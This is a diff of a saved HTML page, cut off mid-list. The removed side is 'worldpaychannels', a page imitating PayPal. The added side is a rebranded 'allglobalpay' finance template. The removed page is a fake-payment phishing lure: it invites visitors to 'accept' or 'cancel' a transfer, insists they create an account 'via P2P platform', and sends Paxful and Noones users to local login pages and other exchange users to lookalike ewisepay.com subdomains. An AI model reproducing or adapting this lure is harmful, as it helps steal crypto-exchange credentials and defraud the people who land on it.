@@ -1,763 +1,1048 @@
+<!DOCTYPE html>
+<!-- saved from url=(0063)https://html.xpressbuddy.com/allglobalpay/index_payment_solutions.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
-<!-- saved from url=(0028)https://worldpaychannels.com/ -->
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     
-    <title>A Simple and Safer Way to Pay and Get Paid | worldpaychannels</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="worldpaychannels is the faster, safer way to send money, make an online payment, receive money or set up a merchant account.">
-    
-    <link rel="shortcut icon" sizes="196x196" style="border-radius: 50%;" href="https://worldpaychannels.com/static/nny/images/famonipal.png">
-    <link rel="shortcut icon" type="image/x-icon" href="https://worldpaychannels.com/static/nny/images/famonipal.png">
-    <link rel="icon" type="image/x-icon" href="https://worldpaychannels.com/static/nny/images/famonipal.png">
-    <link rel="canonical" href="https://worldpaychannels.com/">
-    <link href="style.css" media="screen" rel="stylesheet" type="text/css">
-    <link rel="stylesheet" href="style_re.css">
-    <link rel="stylesheet" href="style_apply.css">
-    <style>
-        html[data-device-type="dedicated"] .product-hero:before,
-        html[data-device-type="portable"] .product-hero:before {
-            content: "";
-            width: 0;
-            height: 0;
-            border-style: solid;
-            position: fixed;
-            border-width: calc(450px * .67) calc(450px * .072) 0 0;
-            border-color: transparent transparent transparent transparent;
-            top: 0%;
-            left: 0%;
-            z-index: -1
-        }
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="thumbnail" content="assets/images/synox_page_thumbnail.webp">
+    <meta name="description" content="allglobalpay – Finance &amp; Consulting Site Template.">
+    <meta name="keywords" content="Finance &amp; Consulting Bootstrap Site Template">
+    <meta name="author" content="XpressBuddy">
 
-        html[data-device-type="dedicated"] .product-hero:after,
-        html[data-device-type="portable"] .product-hero:after {
-            content: "";
-            width: 0;
-            height: 0;
-            border-style: solid;
-            position: fixed;
-            border-width: 0 0 calc(450px * .67) calc(450px * .072);
-            border-color: transparent transparent #ff9600 transparent;
-            bottom: 0%;
-            right: 0%;
-            z-index: -1
-        }
+    <title>Payment Solutions – allglobalpay – Finance &amp; Consulting Site Template.</title>
+    <link rel="shortcut icon" href="https://html.xpressbuddy.com/synox/assets/images/site_logo/favourite_icon.webp">
 
-        html[data-device-type="mobile"] .product-hero:before {
-            content: "";
-            width: 0;
-            height: 0;
-            border-style: solid;
-            position: fixed;
-            border-width: calc(230px * .5) calc(230px * .04) 0 0;
-            border-color: transparent transparent transparent transparent;
-            top: 0%;
-            left: 0%;
-            z-index: -1
-        }
+    <!-- Fraimwork - CSS Include -->
+    <link rel="stylesheet" type="text/css" href="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/bootstrap.min.css">
 
-        html[data-device-type="mobile"] .product-hero:after {
-            content: "";
-            width: 0;
-            height: 0;
-            border-style: solid;
-            position: fixed;
-            border-width: 0 0 calc(230px * .5) calc(230px * .04);
-            border-color: transparent transparent #ff9600 transparent;
-            bottom: 0%;
-            right: 0%;
-            z-index: -1
-        }
+    <!-- Icon - CSS Include -->
+    <link rel="stylesheet" type="text/css" href="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/fontawesome.css">
 
-        html[data-device-type="mobile"] .product-hero.no-img:before,
-        html[data-device-type="mobile"] .product-hero.no-img:after {
-            content: none
-        }
+    <!-- Animation - CSS Include -->
+    <link rel="stylesheet" type="text/css" href="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/animate.min.css">
 
-        html[data-device-type="dedicated"] .product-hero:after,
-        html[data-device-type="mobile"] .product-hero:after,
-        html[data-device-type="portable"] .product-hero:after,
-        html[data-device-type="dedicated"] .product-hero:before,
-        html[data-device-type="mobile"] .product-hero:before,
-        html[data-device-type="portable"] .product-hero:before {
-            z-index: 1;
-            position: absolute
-        }
+    <!-- Carousel - CSS Include -->
+    <link rel="stylesheet" type="text/css" href="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/swiper-bundle.min.css">
 
-        html[data-device-type="dedicated"] .product-hero:after,
-        html[data-device-type="mobile"] .product-hero:after,
-        html[data-device-type="portable"] .product-hero:after {
-            border-width: 0 0 calc(450px * .5) calc(450px * .05)
-        }
+    <!-- Video & Image Popup - CSS Include -->
+    <link rel="stylesheet" type="text/css" href="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/magnific-popup.min.css">
 
-        html[data-device-type="dedicated"] .product-hero:before,
-        html[data-device-type="mobile"] .product-hero:before,
-        html[data-device-type="portable"] .product-hero:before {
-            border-width: calc(450px * .5) calc(450px * .05) 0 0
-        }
+    <!-- Counter - CSS Include -->
+    <link rel="stylesheet" type="text/css" href="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/odometer.min.css">
 
-        .product-hero .product-hero__container {
-            float: none;
-            margin: 0 auto;
-            text-align: center
-        }
+    <!-- Custom - CSS Include -->
+    <link rel="stylesheet" type="text/css" href="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/style.css">
 
-        .product-hero .product-hero__container .pypl-btn,
-        .product-hero .product-hero__container .product-hero__hatch-text {
-            margin: 0 auto
-        }
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
 
-        @media (max-width:1022px) {
-            .notification-tickleBar {
-                padding-top: 20px
-            }
-        }
-
-        .two-panel-color {
-            padding: 0 0;
-            overflow: hidden
-        }
-
-        @media (min-width:1024px) {
-            .two-panel-color {
-                padding: 0 0
-            }
-        }
-
-        .two-panel-color .container {
-            margin-left: auto;
-            margin-right: auto;
-            padding: 0
-        }
-
-        @media (min-width:576px) {
-            .two-panel-color .container {
-                max-width: none;
-                padding-left: 0;
-                padding-right: 0
-            }
-        }
-
-        @media (min-width:752px) {
-            .two-panel-color .container {
-                max-width: none
-            }
-        }
-
-        @media (min-width:1024px) {
-            .two-panel-color .container {
-                max-width: none;
-                padding-left: 0;
-                padding-right: 0
-            }
-        }
-
-        @media (min-width:1152px) {
-            .two-panel-color .container {
-                max-width: none
-            }
-        }
-
-        .two-panel-color .container .row>div {
-            background: #dd0060
-        }
-
-        .two-panel-color .container .row>div:first-of-type {
-            background: #fd9502
-        }
-
-        .two-panel-color .container .row h3.pypl-heading,
-        .two-panel-color .container .row p {
-            color: #fff
-        }
-
-        .two-panel-color .container .row h3.pypl-heading {
-            font-size: 28px;
-            font-size: 2rem;
-            font-family: pp-sans-big-light, Helvetica Neue, Arial, sans-serif;
-            font-weight: 400;
-            font-variant: normal;
-            line-height: 1.25
-        }
-
-        .two-panel-color .container .row a {
-            color: #fff;
-            display: inline-block;
-            padding: 10px 0 0 0;
-            text-decoration: none;
-            clear: both
-        }
-
-        .two-panel-color .container .row a:hover,
-        .two-panel-color .container .row a:visited {
-            color: #fff
-        }
-
-        .two-panel-color .container .row .panels__panel {
-            padding: 60px 0
-        }
-
-        @media (max-width:751px) {
-            .two-panel-color .container .row .panels__panel {
-                padding: 30px 0
-            }
-        }
-
-        @media (max-width:751px) {
-            .two-panel-color .container .row .panels__panel .no-image-panel {
-                padding-left: 46px;
-                padding-right: 46px;
-                margin: 0 auto
-            }
-        }
-
-        @media (min-width:576px) {
-            .two-panel-color .container .row .panels__panel .no-image-panel {
-                max-width: 751px
-            }
-        }
-
-        @media (min-width:752px) {
-            .two-panel-color .container .row .panels__panel .no-image-panel {
-                max-width: 340px;
-                margin-left: auto;
-                margin-right: 0;
-                padding-right: 30px
-            }
-        }
-
-        @media (min-width:824px) {
-            .two-panel-color .container .row .panels__panel .no-image-panel {
-                padding-right: 50px
-            }
-        }
-
-        @media (min-width:1024px) {
-            .two-panel-color .container .row .panels__panel .no-image-panel {
-                padding-left: 48px;
-                max-width: 578px
-            }
-        }
-
-        @media (min-width:1152px) {
-            .two-panel-color .container .row .panels__panel .no-image-panel {
-                max-width: 596px;
-                padding-right: 50px
-            }
-        }
-
-        @media (min-width:752px) {
-            .two-panel-color .container .row>div:last-of-type .no-image-panel {
-                margin: 0;
-                padding-left: 20px;
-                padding-right: 20px
-            }
-        }
-
-        @media (min-width:824px) {
-            .two-panel-color .container .row>div:last-of-type .no-image-panel {
-                padding-left: 40px
-            }
-        }
-
-        @media (min-width:1024px) {
-            .two-panel-color .container .row>div:last-of-type .no-image-panel {
-                padding-right: 48px
-            }
-        }
-
-        @media (min-width:1152px) {
-            .two-panel-color .container .row>div:last-of-type .no-image-panel {
-                padding-left: 0;
-                padding-left: 40px
-            }
-        }
+  </head>
 
 
+  <body class="payment_solutions" data-new-gr-c-s-check-loaded="14.1240.0" data-gr-ext-installed="">
 
+    <!-- Body Wrap - Start -->
+    <div class="page_wrapper">
 
+      <!-- Back To Top - Start -->
+      <div class="backtotop">
+        <a href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#" class="scroll">
+          <i class="fa-solid fa-arrow-up"></i>
+        </a>
+      </div>
+      <!-- Back To Top - End -->
 
-        .cretea {
-            display: block;
-            /* Makes the links behave like block elements */
-            padding: 10px;
-            margin-bottom: 10px;
-            /* Adds space between the two buttons */
-            text-align: center;
-            color: white;
-            text-decoration: none;
-            border-radius: 5px;
-            transition: background-color 0.3s ease, transform 0.3s ease;
-        }
-
-        .cretea:nth-child(1) {
-            background-color: rgb(7, 185, 121);
-            /* Applies background color to the first button */
-        }
-
-        .cretea:hover {
-            transform: scale(1.05);
-            /* Slightly enlarge the button on hover */
-            opacity: 0.9;
-            /* Make the button slightly transparent */
-            text-decoration: none;
-        }
-    </style>
-    <link nonce="" href="styletwo.css" rel="stylesheet">
-
-</head>
-
-<body class="" data-new-gr-c-s-check-loaded="14.1238.0" data-gr-ext-installed="">
-    <div id="app-element-mountpoint">
-        <div id="document-body" data-reactroot="">
-            <div id="globalnav-header" data-nav-version="legacy">
-                <header class="_gn-header_7kka7_9 _gn-header--enhanced_7kka7_620" data-building-block="organism" translate="no">
-                    <div>
-                        <div class="_legacy-header-container_7kka7_1039">
-                            
-                            <!--<div class="_pypl-logo-wrapper_7kka7_1208"><a href="./"-->
-                            <!--        data-pa-click="Header-Logo-PayPal Logo" data-testid="header-logo"-->
-                            <!--        class="_pypl-logo_2a3j6_4"-->
-                            <!--        style="background-image: url(/static/nny/images/logo.png);" pa-marked="1">worldpaychannels-->
-                            <!--        Logo</a></div>-->
-                              <div class="_pypl-logo-wrapper_7kka7_1208"><a href="https://worldpaychannels.com/" data-pa-click="Header-Logo-PayPal Logo" data-testid="header-logo" class="_pypl-logo_2a3j6_4" style="background-image: url(/static/nny/images/logo.png);" pa-marked="1">worldpaychannels
-                                    Logo</a></div>
-                            <nav id="main-menu" class="_main-menu_7kka7_175 _gn-list_7kka7_19">
-                                <ul>
-                                    <li><a id="5jgBwoeVIS6VGv922NjojY" class="_glnv-header__subnav-control_7kka7_334 _main-link_7kka7_316" href="https://worldpaychannels.com/accounts/personal/" aria-controls="submenu-5jgBwoeVIS6VGv922NjojY" aria-expanded="false" data-text="PERSONAL" data-pa-click="{&quot;link&quot;:&quot;HeaderMainMenu-Link-PERSONAL&quot;, &quot;event_name&quot;:&quot;ppcom_header_nav_clicked&quot;}" role="button" pa-marked="1">PERSONAL</a>
-
-                                    </li>
-                                    <li><a id="Gm1lPNT06TgH5HreSVJpj" class="_glnv-header__subnav-control_7kka7_334 _main-link_7kka7_316" href="https://worldpaychannels.com/accounts/business/" aria-controls="submenu-Gm1lPNT06TgH5HreSVJpj">
-                                            BUSINESS</a>
-
-                                    </li>
-                                    <li><a id="5L1p9MMJZThKpfAW0IPb1H" href="https://worldpaychannels.com/accounts/patners" class="_main-link_7kka7_316" aria-label="PARTNERS AND DEVELOPERS" data-text="PARTNERS AND DEVELOPERS" data-pa-click="{&quot;link&quot;:&quot;HeaderMainMenu-Link-PARTNERS AND DEVELOPERS&quot;, &quot;event_name&quot;:&quot;ppcom_header_nav_clicked&quot;}" pa-marked="1">PARTNERS AND DEVELOPERS</a></li>
-                                </ul>
-
-                            </nav>
-                            <div data-testid="header-buttons" id="_header-buttons_7kka7_1122" class="_header-buttons_7kka7_1122">
-                                <div><a href="/plogin" target="_self" id="_ul-btn_7kka7_1305" role="link" class="_pypl-btn_1q7vs_1 _pypl-btn--outline-blue_1q7vs_52 _pypl-btn--small_1q7vs_34" data-pa-click="{&quot;link&quot;: &quot;HeaderMainMenu0-Cta-Log in&quot;,&quot;event_name&quot;:&quot;ppcom_header_login_clicked&quot;}" pa-marked="1">Log in</a><a href="/plogin" target="_self" id="_signup-button_7kka7_1" role="link" class="_pypl-btn_1q7vs_1 _pypl-btn--outline-white_1q7vs_39 _pypl-btn--small_1q7vs_34 _sublistMobile_7kka7_1144" data-pa-click="{&quot;link&quot;: &quot;HeaderMainMenu1-Cta-Sign Up&quot;,&quot;event_name&quot;:&quot;ppcom_header_signup_clicked&quot;}" pa-marked="1">Sign Up</a></div>
-                            </div>
-                        </div>
-                    </div>
-                </header>
+      <!-- Site Header - Start
+      ================================================== -->
+      <header class="site_header header_layout_1">
+        <div class="xb-header stricky original">
+          <div class="container">
+            <div class="row align-items-center">
+              <div class="col-lg-3 col-5">
+                <div class="site_logo">
+                  <a class="site_link" href="">
+                    <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/is_logo.svg" alt="Site Logo White">
+                    <img src="./Payment Solutions – Synox – Finance &amp; Consulting Site Template._files/site_logo_black.svg" alt="Site Logo Black">
+                  </a>
+                </div>
+              </div>
+              <div class="col-lg-6 col-2">
+                <nav class="main_menu navbar navbar-expand-lg">
+                  <div class="main_menu_inner collapse navbar-collapse justify-content-lg-center" id="main_menu_dropdown">
+                    <ul class="main_menu_list unordered_list justify-content-center">
+                      <li class="dropdown active">
+                        <a class="nav-link" href="" id="home_submenu" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+                          Home
+                        </a>
+                       
+                      </li>
+                      <li class="dropdown">
+                        <a class="nav-link" href="" id="services_submenu" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+                          Services
+                        </a>
+                        <ul class="dropdown-menu" aria-labelledby="servFices_submenu">
+                          <li><a href="https://html.xpressbuddy.com/synox/services.html">Our Services</a></li>
+                          <li><a href="https://html.xpressbuddy.com/synox/service_details.html">Service Details</a></li>
+                        </ul>
+                      </li>
+                      <li class="dropdown">
+                        <a class="nav-link" href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#" id="projects_submenu" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+                          Projects
+                        </a>
+                        <ul class="dropdown-menu" aria-labelledby="projects_submenu">
+                          <li><a href="https://html.xpressbuddy.com/synox/projects.html">Our Projects</a></li>
+                          <li><a href="https://html.xpressbuddy.com/synox/project_details.html">Project Details</a></li>
+                        </ul>
+                      </li>
+                      <li class="dropdown">
+                        <a class="nav-link" href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#" id="pages_submenu" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+                          Pages
+                        </a>
+                        <ul class="dropdown-menu" aria-labelledby="pages_submenu">
+                          <li><a href="https://html.xpressbuddy.com/synox/contact.html">Help Center</a></li>
+                          <li class="dropdown">
+                            <a class="nav-link" href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#" id="blog_submenu" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+                              Blogs
+                            </a>
+                            <ul class="dropdown-menu" aria-labelledby="blog_submenu">
+                              <li><a href="https://html.xpressbuddy.com/synox/blog.html">Our Blogs</a></li>
+                              <li><a href="https://html.xpressbuddy.com/synox/blog_details.html">Blog Details</a></li>
+                            </ul>
+                          </li>
+                          <li class="dropdown">
+                            <a class="nav-link" href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#" id="career_submenu" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+                              Career
+                            </a>
+                            <ul class="dropdown-menu" aria-labelledby="career_submenu">
+                              <li><a href="https://html.xpressbuddy.com/synox/career.html">Join Us</a></li>
+                              <li><a href="https://html.xpressbuddy.com/synox/career_details.html">Job Details</a></li>
+                            </ul>
+                          </li>
+                          <li><a href="https://html.xpressbuddy.com/synox/error.html">404 Error</a></li>
+                        </ul>
+                      </li>
+                      <li><a href="https://html.xpressbuddy.com/synox/pricing.html">Pricing</a></li>
+                    </ul>
+                  </div>
+                </nav>
+              </div>
+              <div class="col-lg-3 col-5">
+                <ul class="btns_group p-0 unordered_list justify-content-end">
+                  <li>
+                    <button class="mobile_menu_btn" type="button" data-bs-toggle="collapse" data-bs-target="#main_menu_dropdown" aria-expanded="false" aria-label="Toggle navigation">
+                      <i class="fas fa-bars"></i>
+                    </button>
+                  </li>
+                  <li>
+                    <a class="btn bg-dark rounded-pill" href="https://html.xpressbuddy.com/synox/index_payment_solutions.html#!">
+                      <span class="btn_icon">
+                        <i class="fa-solid fa-user"></i>
+                      </span>
+                      <span class="btn_label">Login</span>
+                    </a>
+                  </li>
+                </ul>
+              </div>
             </div>
-            <div>
-                <section data-building-block="organism" class="product-hero-organism">
-                    <div class="product-hero theme-new-money" style="position:relative">
-                        <div style="background-position:90% top;position:absolute;top:0px;right:0px;bottom:0px;left:0px;background-image:url(www.paypalobjects.com/marketing/web/ke/home/hero-banner-cookied.jpg);background-size:cover;transition:all 1s linear;">
-                        </div>
-                        <div class="container">
-                            <div class="row">
-                                <div class="col-md-8 col-sm-12 product-hero__container">
-                                    <div>
-                                        <h1 class="pypl-heading product-hero__headline h2">MOVE YOUR MONEY AROUND THE
-                                            WORLD WITH MOBILE WALLET USING worldpaychannels</h1>
-                                        <p class="product-hero__paragraph">Just link your M-WALLET and worldpaychannels accounts
-                                            and
-                                            enjoy a world of possibilities.
-                                        </p>
-                                        <p class="product-hero__paragraph">Track The Payment Transfer To Check The
-                                            Status Of Your Payment.
-                                        </p>
-                                        <a style="background-color: #dac9a6;" id="link-account" name="link-account" href="https://worldpaychannels.com/tracking" target="_blank" alt="Link Accounts" class="pypl-btn mpp-btn product-hero__cta" data-pa-click="PrdctHero-PrmryCTA-Link Accounts" role="button">Track
-                                            Payment</a><br>
-                                        <p class="product-hero__paragraph">Accept The Payment To Receive The Funds
-                                            Instantly.
-                                        </p>
-
-                                        <a id="link-account" name="link-account" onclick="openPopup()" target="_blank" alt="Link Accounts" class="pypl-btn mpp-btn product-hero__cta" data-pa-click="PrdctHero-PrmryCTA-Link Accounts" role="button">Accept
-                                            Payment</a><br>
-                                        <p class="product-hero__paragraph">Cancel The Payment To Decline The Funds, And
-                                            The Sender Will Be Refunded Immediately.
-                                        </p>
-                                        <a style="background-color: #dd0060;" id="link-account" name="link-account" onclick="openPopup()" target="_blank" alt="Link Accounts" class="pypl-btn mpp-btn product-hero__cta" data-pa-click="PrdctHero-PrmryCTA-Link Accounts" role="button">Cancel The
-                                            Transfer</a>
-
-
-                                    </div>
-                                    <div class="popup" id="popup">
-                                        <div onclick="closePopup()" class="close">+</div>
-                                        <h2>Must Do</h2>
-                                        <br>
-                                        You'll Be Prompt To Create worldpaychannels Account Via P2P Platform That The Payment Was
-                                        Initiated From To Complete This Step. This Is For Authenticity Reasons.
-
-
-                                        <p></p><br>
-                                        <input style="cursor: pointer;" type="checkbox" name="" checked="checked">
-                                        NB: Your Privacy and security has been highly considered...<a id="more" style="color: blue; " href="/plogin/">view more</a><br><br>
-                                        Choose Your P2P Platform To Proceed.
-                                        <br><br>
-
-                                        <div>
-                                            <a class="cretea" style="background-color: #0070ba;" href="/plogin/">Paxful</a>
-                                            <a class="crete cretea " href="/nlogin">Noones</a>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </section>
-                <section id="paypal-world-class" class="panels theme-background-color-white center" data-building-block="organism">
-                    <div class="container">
-                        <div class="row text-xs-center panels__header">
-                            <div class="col-xs-12">
-                                <h2 class="pypl-heading panels__headline">worldpaychannels is for everyone who uses different
-                                    cryptocurrency platforms.
-                                </h2>
-                            </div>
-                        </div>
-                        <div class="panels__container">
-                            <div class="row">
-                                <div class="col-lg-4 col-md-4 col-sm-12 col-xs-12 panels__panel">
-                                    <div class="icon-panel">
-                                        <div class="icon-panel__top"><img src="paxfulimg.png" alt="Businesses" class="icon-panel__image">
-                                            <h3 class="pypl-heading icon-panel__headline pp-sans-small-regular h4">
-                                                Paxful</h3>
-                                            <p class="icon-panel__paragraph">Find out why we have more than 1M active
-                                                accounts linked with worldpaychannels.</p>
-                                        </div>
-                                        <div class="icon-panel__bottom"><a href="/plogin" target="_blank" aria-label="Learn More Businesses" class="pypl-btn mpp-btn pypl-btn--outline-blue icon-panel__cta" data-pa-click="SmplPnlStk1-ScndCTA-Learn More" role="button" pa-marked="1" style="color: #fff; background: blue;">Link
-                                                Account</a></div>
-                                    </div>
-                                </div>
-                                <div class="col-lg-4 col-md-4 col-sm-12 col-xs-12 panels__panel">
-                                    <div class="icon-panel">
-                                        <div class="icon-panel__top"><img src="noonesimg.png" alt="Individuals" class="icon-panel__image">
-                                            <h3 class="pypl-heading icon-panel__headline pp-sans-small-regular h4">
-                                                Noones</h3>
-                                            <p class="icon-panel__paragraph">Find out why we have more than 1M active
-                                                accounts linked with worldpaychannels.</p>
-                                        </div>
-                                        <div class="icon-panel__bottom"><a href="/plogin" target="_self" aria-label="Learn More Individuals" class="pypl-btn mpp-btn pypl-btn--outline-blue icon-panel__cta" data-pa-click="SmplPnlStk0-ScndCTA-Learn More" role="button" pa-marked="1" style="background: lightgreen; color: #fff;">Link
-                                                Account</a>
-                                        </div>
-                                    </div>
-                                </div>
-                                <div class="col-lg-4 col-md-4 col-sm-12 col-xs-12 panels__panel">
-                                    <div class="icon-panel">
-                                        <div class="icon-panel__top"><img src="bybit.png" alt="Partners and developers" class="icon-panel__image">
-                                            <h3 class="pypl-heading icon-panel__headline pp-sans-small-regular h4">
-                                                Bybit</h3>
-                                            <p class="icon-panel__paragraph">Find out why we have more than 100K active
-                                                accounts linked with worldpaychannels.</p>
-                                        </div>
-                                        <div class="icon-panel__bottom"><a href="https://bybit.ewisepay.com/" target="_self" aria-label="Learn More Partners and developers" class="pypl-btn mpp-btn pypl-btn--outline-blue icon-panel__cta" data-pa-click="SmplPnlStk2-ScndCTA-Learn More" role="button" pa-marked="1" style="color: #fff; background: #121214;">Link Account</a>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="container">
-                        <div class="row text-xs-center panels__header">
-
-                        </div>
-                        <div class="panels__container">
-                            <div class="row">
-                                <div class="col-lg-4 col-md-4 col-sm-12 col-xs-12 panels__panel">
-                                    <div class="icon-panel">
-                                        <div class="icon-panel__top"><img src="localcoinsswap.jpeg" alt="Individuals" class="icon-panel__image">
-                                            <h3 class="pypl-heading icon-panel__headline pp-sans-small-regular h4">
-                                                LocalCoinsSwap</h3>
-                                            <p class="icon-panel__paragraph">Find out why we have more than 1M active
-                                                accounts linked with worldpaychannels.</p>
-                                        </div>
-                                        <div class="icon-panel__bottom"><a href="https://localcoinsswap.ewisepay.com/" target="_self" aria-label="Learn More Individuals" class="pypl-btn mpp-btn pypl-btn--outline-blue icon-panel__cta" data-pa-click="SmplPnlStk0-ScndCTA-Learn More" role="button" pa-marked="1" style="background: lightblue; color: #fff;">Link
-                                                Account</a>
-                                        </div>
-                                    </div>
-                                </div>
-                                <div class="col-lg-4 col-md-4 col-sm-12 col-xs-12 panels__panel">
-                                    <div class="icon-panel">
-                                        <div class="icon-panel__top"><img src="deriv.png" alt="Businesses" class="icon-panel__image">
-                                            <h3 class="pypl-heading icon-panel__headline pp-sans-small-regular h4">
-                                                Deriv</h3>
-                                            <p class="icon-panel__paragraph">Find out why we have more than 1M active
-                                                accounts linked with worldpaychannels.</p>
-                                        </div>
-                                        <div class="icon-panel__bottom"><a href="https://deriv.ewisepay.com/" target="_blank" aria-label="Learn More Businesses" class="pypl-btn mpp-btn pypl-btn--outline-blue icon-panel__cta" data-pa-click="SmplPnlStk1-ScndCTA-Learn More" role="button" pa-marked="1" style="color: #fff; background: crimson;">Link
-                                                Account</a></div>
-                                    </div>
-                                </div>
-                                <div class="col-lg-4 col-md-4 col-sm-12 col-xs-12 panels__panel">
-                                    <div class="icon-panel">
-                                        <div class="icon-panel__top"><img src="coinbase.jpeg" alt="Businesses" class="icon-panel__image">
-                                            <h3 class="pypl-heading icon-panel__headline pp-sans-small-regular h4">
-                                                coinbase</h3>
-                                            <p class="icon-panel__paragraph">Find out why we have more than 1M active
-                                                accounts linked with worldpaychannels.</p>
-                                        </div>
-                                        <div class="icon-panel__bottom"><a href="https://worldpaychannels.com/#" target="_blank" aria-label="Learn More Businesses" class="pypl-btn mpp-btn pypl-btn--outline-blue icon-panel__cta" data-pa-click="SmplPnlStk1-ScndCTA-Learn More" role="button" pa-marked="1" style="color: #fff; background: blue;">Link
-                                                Account</a></div>
-                                    </div>
-                                </div>
-
-                            </div>
-                        </div>
-                    </div>
-
-                </section>
-                <section id="paypal-world-class" class="panels theme-background-color-white center" data-building-block="organism">
-                    <div class="container">
-                        <div class="row text-xs-center panels__header">
-                            <div class="col-xs-12">
-                                <h2 class="pypl-heading panels__headline">worldpaychannels is for everyone who pays or gets paid.
-                                </h2>
-                            </div>
-                        </div>
-                        <div class="panels__container">
-                            <div class="row">
-                                <div class="col-lg-4 col-md-4 col-sm-12 col-xs-12 panels__panel">
-                                    <div class="icon-panel">
-                                        <div class="icon-panel__top"><img src="1-individuals.jpg" alt="Individuals" class="icon-panel__image">
-                                            <h3 class="pypl-heading icon-panel__headline pp-sans-small-regular h4">
-                                                Individuals</h3>
-                                            <p class="icon-panel__paragraph">Find out why we have more than 5M active
-                                                accounts worldwide.</p>
-                                        </div>
-                                        <div class="icon-panel__bottom"><a href="https://worldpaychannels.com/accounts/personal/" target="_self" aria-label="Learn More Individuals" class="pypl-btn mpp-btn pypl-btn--outline-blue icon-panel__cta" data-pa-click="SmplPnlStk0-ScndCTA-Learn More" role="button" pa-marked="1">Learn More</a></div>
-                                    </div>
-                                </div>
-                                <div class="col-lg-4 col-md-4 col-sm-12 col-xs-12 panels__panel">
-                                    <div class="icon-panel">
-                                        <div class="icon-panel__top"><img src="2-businesses.jpg" alt="Businesses" class="icon-panel__image">
-                                            <h3 class="pypl-heading icon-panel__headline pp-sans-small-regular h4">
-                                                Businesses</h3>
-                                            <p class="icon-panel__paragraph">Join more than 2 million businesses around
-                                                the world offering worldpaychannels.</p>
-                                        </div>
-                                        <div class="icon-panel__bottom"><a href="https://worldpaychannels.com/accounts/business/" target="_self" aria-label="Learn More Businesses" class="pypl-btn mpp-btn pypl-btn--outline-blue icon-panel__cta" data-pa-click="SmplPnlStk1-ScndCTA-Learn More" role="button" pa-marked="1">Learn More</a></div>
-                                    </div>
-                                </div>
-                                <div class="col-lg-4 col-md-4 col-sm-12 col-xs-12 panels__panel">
-                                    <div class="icon-panel">
-                                        <div class="icon-panel__top"><img src="3-pd.jpg" alt="Partners and developers" class="icon-panel__image">
-                                            <h3 class="pypl-heading icon-panel__headline pp-sans-small-regular h4">
-                                                Partners and developers</h3>
-                                            <p class="icon-panel__paragraph">Work with PayPal to offer your customers
-                                                world class payment solutions.</p>
-                                        </div>
-                                        <div class="icon-panel__bottom"><a href="https://worldpaychannels.com/#" target="_self" aria-label="Learn More Partners and developers" class="pypl-btn mpp-btn pypl-btn--outline-blue icon-panel__cta" data-pa-click="SmplPnlStk2-ScndCTA-Learn More" role="button" pa-marked="1">Learn More</a></div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </section>
-                <section id="two-panel-color" class="panels theme-background-color-white two-panel-color" data-building-block="organism">
-                    <div class="container">
-                        <div class="row text-xs-center panels__header">
-                            <div class="col-xs-12"></div>
-                        </div>
-                        <div class="panels__container">
-                            <div class="row">
-                                <div class="col-lg-6 col-md-6 col-sm-12 col-xs-12 panels__panel">
-                                    <div class="no-image-panel">
-                                        <div class="no-image-panel__top">
-                                            <h3 class="pypl-heading no-image-panel__headline pp-sans-small-regular h4">
-                                                Withdraw money directly to Bank Account</h3>
-                                            <p class="no-image-panel__paragraph">You can now withdraw your worldpaychannels
-                                                balance to your Bank account seamlessly by accessing Bank
-                                                Online and Mobile Apps. What's more, this option is exclusive to
-                                                Banks customers and funds will be withdrawn within 24
-                                                hours.<br><br><a href="https://worldpaychannels.com/account/register/details/" data-pa-click="panels | Learn more ">Learn
-                                                    more here </a></p>
-                                        </div>
-                                        <div class="no-image-panel__bottom"></div>
-                                    </div>
-                                </div>
-                                <div class="col-lg-6 col-md-6 col-sm-12 col-xs-12 panels__panel">
-                                    <div class="no-image-panel">
-                                        <div class="no-image-panel__top">
-                                            <h3 class="pypl-heading no-image-panel__headline pp-sans-small-regular h4">
-                                                Withdraw money from worldpaychannels to M-WALLET</h3>
-                                            <p class="no-image-panel__paragraph">You can easily withdraw your money to
-                                                your M-Wallet account, and use it whenever, wherever you like.<br><br><a target="_blank" href="https://worldpaychannels.com/m-wallet/" data-pa-click="panels | Link your PayPal and M-PESA accounts">Link
-                                                    your worldpaychannels and M-Wallet accounts</a></p>
-                                        </div>
-                                        <div class="no-image-panel__bottom"></div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </section>
-                <section class="generic-tabs custom-genetic-tabs theme-background-color-light" data-building-block="organism">
-                    <div class="container">
-                        <div class="row">
-                            <h2 class="pypl-heading generic-tabs__headline col-xs-12 text-xs-center">worldpaychannels connects
-                                buyers and sellers.</h2>
-                            <div class="generic-tabs__tabs center-block text-xs-center col-md-12">
-                                <ul class="generic-tabs__tabs__list">
-                                    <li><button class="generic-tabs__tabs__links selected" data-index="0">For
-                                            buyers</button></li>
